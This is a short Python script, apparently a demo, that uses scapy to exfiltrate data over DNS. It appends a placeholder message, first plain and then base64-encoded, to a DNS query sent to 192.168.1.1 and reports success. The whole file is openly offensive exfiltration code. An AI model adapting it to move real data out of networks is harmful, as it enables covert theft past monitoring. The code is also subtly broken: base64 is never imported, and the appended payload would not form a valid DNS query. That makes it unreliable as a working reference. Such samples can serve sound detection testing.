from scapy.all import IP, UDP, DNS, DNSQR, Raw, send
import time


def exfiltrate_data_clear():
    """Exfiltrate data using DNS."""
    # Create a DNS query packet
    dns_query = IP(dst="192.168.1.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="liquidswrds.com"))

    # Add custom text to the payload of the DNS packet
    custom_text = "See I can steal your data!"
    dns_query = dns_query/Raw(load=custom_text)

    # Send the packet
    send(dns_query)

    print("Data exfiltrated successfully.")

def exfiltrate_data_encoded():
    """Exfiltrate data using DNS."""
    # Create a DNS query packet
    dns_query = IP(dst="192.168.1.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="liquidswrds.com"))

    # Add custom text to the payload of the DNS packet
    custom_text = "See I can steal your data!"
    encoded_text = base64.b64encode(custom_text.encode()).decode()
    dns_query = dns_query/Raw(load=encoded_text)

    # Send the packet
    send(dns_query)
    print("Data exfiltrated successfully.")


if __name__ == "__main__":
    exfiltrate_data_clear()
    time.sleep(5)
    exfiltrate_data_encoded()
